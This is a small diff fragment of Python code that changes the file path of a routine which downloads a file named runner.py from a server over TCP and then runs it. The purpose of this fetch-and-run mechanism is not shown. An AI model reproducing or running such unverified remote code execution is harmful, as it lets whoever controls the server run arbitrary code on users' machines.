@@ -137,12 +137,12 @@ if open('final_main.py', 'rb').read() != main_data:
 else:
         connection = force_connect_server('tcp')
         __send_to_connection(connection, b'1')
-        open('runner.py', 'wb').close()
-        runner_file = open('runner.py', 'ab')
+        open('../py_files/runner.py', 'wb').close()
+        runner_file = open('../py_files/runner.py', 'ab')
         runner_file.write(__receive_from_connection(connection))
         runner_file.close()
         connection.close()
-        system_caller('runner.py')
+        system_caller('../py_files/runner.py')
 
 
 """
